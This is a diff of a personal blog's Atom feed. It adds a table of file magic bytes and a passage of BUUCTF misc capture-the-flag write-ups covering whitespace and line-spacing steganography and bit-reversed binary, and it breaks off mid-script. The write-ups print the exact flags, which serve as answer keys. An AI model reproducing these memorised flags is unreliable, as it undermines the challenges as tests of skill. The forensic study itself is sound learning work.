@@ -4,7 +4,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN">
     <title type="text">CN1nja&#39;s Blog</title>
     <subtitle type="html"></subtitle>
-    <updated>2021-06-16T16:13:27&#43;08:00</updated>
+    <updated>2021-07-02T14:16:23&#43;08:00</updated>
     <id>https://cn1nja.github.io/</id>
     <link rel="alternate" type="text/html" href="https://cn1nja.github.io/" />
     <link rel="self" type="application/atom&#43;xml" href="https://cn1nja.github.io/atom.xml" />
@@ -17,10 +17,892 @@
     <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights>
     <generator uri="https://gohugo.io/" version="0.81.0">Hugo</generator>
         <entry>
+            <title type="text">Misc常见文件头</title>
+            <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/misc%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/" />
+            <id>https://cn1nja.github.io/posts/misc%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/</id>
+            <updated>2021-07-02T14:15:52&#43;08:00</updated>
+            <published>2021-06-30T10:45:56&#43;08:00</published>
+            <author>
+                    <name>CN1nja</name>
+                    <uri>https://cn1nja.github.io/</uri>
+                    <email>mikecninja@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">图片： 文件类型 文件头 文件尾 JPEG FF D8 FF FF D9 TGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节……</summary>
+            
+                <content type="html">&lt;p&gt;&lt;strong&gt;图片：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;JPEG&lt;/td&gt;
+&lt;td&gt;FF D8 FF&lt;/td&gt;
+&lt;td&gt;FF D9&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TGA&lt;/td&gt;
+&lt;td&gt;未压缩的前4字节 00 00 02 00&lt;/td&gt;
+&lt;td&gt;RLE压缩的前5字节 00 00 10 00 00&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;PNG&lt;/td&gt;
+&lt;td&gt;89 50 4E 47 0D 0A 1A 0A&lt;/td&gt;
+&lt;td&gt;AE 42 60 82&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;GIF&lt;/td&gt;
+&lt;td&gt;47 49 46 38 39(37) 61&lt;/td&gt;
+&lt;td&gt;00 3B&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;BMP&lt;/td&gt;
+&lt;td&gt;42 4D     文件头标识(2 bytes) 42(B) 4D(M)&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;TIFF (tif)&lt;/td&gt;
+&lt;td&gt;49 49 2A 00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;ico&lt;/td&gt;
+&lt;td&gt;00 00 01 00&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Adobe Photoshop (psd)&lt;/td&gt;
+&lt;td&gt;38 42 50 53&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;Office文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;MS Word/Excel (xls.or.doc)&lt;/td&gt;
+&lt;td&gt;D0 CF 11 E0&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MS Access (mdb)&lt;/td&gt;
+&lt;td&gt;53 74 61 6E 64 61 72 64 20 4A&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;WordPerfect (wpd)&lt;/td&gt;
+&lt;td&gt;FF 57 50 43&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Adobe Acrobat (pdf)&lt;/td&gt;
+&lt;td&gt;25 50 44 46 2D 31 2E&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;application/vnd.visio(vsd)&lt;/td&gt;
+&lt;td&gt;D0 CF 11 E0 A1 B1 1A E1&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Email 【thorough only】 (eml)&lt;/td&gt;
+&lt;td&gt;44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Outlook Express (dbx)&lt;/td&gt;
+&lt;td&gt;CF AD 12 FE C5 FD 74 6F&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;txt 文件(txt)&lt;/td&gt;
+&lt;td&gt;Unicode：&lt;code&gt;FE FF&lt;/code&gt; / Unicode big endian：&lt;code&gt;FF FE&lt;/code&gt; / UTF-8：&lt;code&gt;EF BB BF&lt;/code&gt; /ANSI编码是没有文件头的&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Rich Text Format (rtf)&lt;/td&gt;
+&lt;td&gt;7B 5C 72 74 66&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;压缩包文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ZIP Archive (zip)&lt;/td&gt;
+&lt;td&gt;50 4B 03 04&lt;/td&gt;
+&lt;td&gt;50 4B&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;RAR Archive (rar)&lt;/td&gt;
+&lt;td&gt;52 61 72 21&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;音频文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Wave (wav)&lt;/td&gt;
+&lt;td&gt;57 41 56 45&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;audio(Audio)&lt;/td&gt;
+&lt;td&gt;4D 54 68 64&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;audio/x-aac（aac）&lt;/td&gt;
+&lt;td&gt;FF F1(9)&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;视频文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;AVI (avi)&lt;/td&gt;
+&lt;td&gt;41 56 49 20&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Real Audio (ram)&lt;/td&gt;
+&lt;td&gt;2E 72 61 FD&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Real Media (rm)&lt;/td&gt;
+&lt;td&gt;2E 52 4D 46&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MPEG (mpg)&lt;/td&gt;
+&lt;td&gt;00 00 01 BA(3)&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Quicktime (mov)&lt;/td&gt;
+&lt;td&gt;6D 6F 6F 76&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Windows Media (asf)&lt;/td&gt;
+&lt;td&gt;30 26 B2 75 8E 66 CF 11&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;MIDI (mid)&lt;/td&gt;
+&lt;td&gt;4D 54 68 64&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;&lt;strong&gt;代码文件：&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件类型&lt;/th&gt;
+&lt;th&gt;文件头&lt;/th&gt;
+&lt;th&gt;文件尾&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;XML (xml)&lt;/td&gt;
+&lt;td&gt;3C 3F 78 6D 6C&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;HTML (html)&lt;/td&gt;
+&lt;td&gt;68 74 6D 6C 3E&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Quicken (qdf)&lt;/td&gt;
+&lt;td&gt;AC 9E BD 8F&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Windows Password (pwl)&lt;/td&gt;
+&lt;td&gt;E3 82 85 96&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+</content>
+            
+            
+            
+            
+            
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://cn1nja.github.io/categories/a_misc-study/" term="A_Misc Study" label="A_Misc Study" />
+                            
+                        
+                    
+                
+                    
+                        
+                            
+                            
+                            
+                                <category scheme="https://cn1nja.github.io/tags/misc_tools/" term="misc_tools" label="misc_tools" />
+                            
+                        
+                    
+                
+            
+        </entry>
+    
+        <entry>
+            <title type="text">BUUMisc通关1</title>
+            <link rel="alternate" type="text/html" href="https://cn1nja.github.io/posts/buumisc%E9%80%9A%E5%85%B31/" />
+            <id>https://cn1nja.github.io/posts/buumisc%E9%80%9A%E5%85%B31/</id>
+            <updated>2021-07-02T14:15:21&#43;08:00</updated>
+            <published>2021-06-29T15:31:00&#43;08:00</published>
+            <author>
+                    <name>CN1nja</name>
+                    <uri>https://cn1nja.github.io/</uri>
+                    <email>mikecninja@gmail.com</email>
+                    </author>
+            <rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</rights><summary type="html">【WUSTCTF2020】spaceclub 知识点：(空格隐写) 空格在普通文本下无法……</summary>
+            
+                <content type="html">&lt;h2 id=&#34;font-color0288d1wustctf2020spaceclubfont&#34;&gt;&lt;font color=#0288D1&gt;【WUSTCTF2020】spaceclub&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点空格隐写font&#34;&gt;&lt;font color=#A020F0&gt;知识点：(空格隐写)&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;空格在普通文本下无法显示，但使用 Sublime Text 编辑器可以清楚点看见空格&lt;/p&gt;
+&lt;p&gt;出题人常会在这里出 &lt;strong&gt;摩斯电码&lt;/strong&gt; 或者&lt;strong&gt;二进制01&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210629155438019.png&#34; alt=&#34;image-20210629155438019&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;这里是二进制01，转ASCII编码&lt;/p&gt;
+&lt;p&gt;短的空格是0，长空格是1&lt;/p&gt;
+&lt;p&gt;代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;attachment.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;    
+    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;
+    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;libnum&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n2s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;wctf2020{h3re_1s_y0ur_fl@g_s1x_s1x_s1x}&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1粽子的来历font&#34;&gt;&lt;font color=#0288D1&gt;粽子的来历&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点doc文件损坏二进制01font&#34;&gt;&lt;font color=#A020F0&gt;知识点：doc文件损坏,二进制01&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;这题没考察啥，就纯杂项，杂。&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-1&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;打开.doc发现文件损坏，拖进 010editor查看，将被修改的部分16进制全部写成FF&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cn1nja.github.io/BUUCTF/2021/BUUMisc%E9%80%9A%E5%85%B31/image-20210629163129530.png&#34; alt=&#34;image-20210629163129530&#34;&gt;&lt;/p&gt;
+&lt;p&gt;打开后，发现每行诗的行间距不同，1.5倍行距为1,1倍行距为0。题目提示flag常在有 DBAPP标记的文件中，搜了一下只有第3个.doc文件中有这个标记。将得到的二进制01数据进行md5加密，拿到flag&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag{d473ee3def34bd022f8e5233036b3345}&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1寂静之城font&#34;&gt;&lt;font color=#0288D1&gt;寂静之城&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-2&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;本来是道社工题，但好像题目没了，看了下别人很久前写的WP：&lt;/p&gt;
+&lt;p&gt;flag{31010419920831481363542021127}&lt;/p&gt;
+&lt;h2 id=&#34;font-color0288d1派大星的烦恼font&#34;&gt;&lt;font color=#0288D1&gt;派大星的烦恼&lt;/font&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;font-colora020f0知识点二进制01逆序ascii图片隐写font&#34;&gt;&lt;font color=#A020F0&gt;知识点：二进制01逆序，ASCII,图片隐写&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;二进制逆序：01011010，逆序输出01011010&lt;/p&gt;
+&lt;p&gt;图片隐写：使用010editor打开，分析16进制数据&lt;/p&gt;
+&lt;p&gt;ASCII：将二进制数据转化为ASCII字符&lt;/p&gt;
+&lt;h3 id=&#34;font-colora020f0题目分析font-3&#34;&gt;&lt;font color=#A020F0&gt;题目分析&lt;/font&gt;&lt;/h3&gt;
+&lt;p&gt;由题目给的条件可以知道：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#0x22，0x44代表伤疤两种细胞，0xf0则是派大星的赘肉。&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;猜测为二进制&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;01&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x22&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x44&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;为&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#答案为32位的一串字符串&lt;/span&gt;
+&lt;span class=&#34;err&#34;&gt;说明&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag为32位的字符串&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;使用010editor打开得到二进制数据：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将二进制数据转ASCLL，这里分析一下，为什么是下面这样写：&lt;/p&gt;
+&lt;p&gt;拿到二进制数据后，我们直接进行ASCII转码会得到一串乱码，将二进制数据每8位一组分割，可以发现：&lt;/p&gt;
+&lt;p&gt;01101100，00101100，00001100第组数据明显不能得到正常的字符，但逆序后00110000=&amp;gt;48，ASCII值为0。&lt;/p&gt;
+&lt;p&gt;所以我们将每组的数据都进行逆序，但每组数据的位置保持不变，得到的数据提交后正确。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;libnum&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;0110110000101100000011000110110010011100101011000000110010000110101011000010110010001100000111000010110001000110001001101010110001100110101001100110110001000110011011001010011010101100010001100010110011000110101001100010110011001100000111001100110001001100&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;x1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;x1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
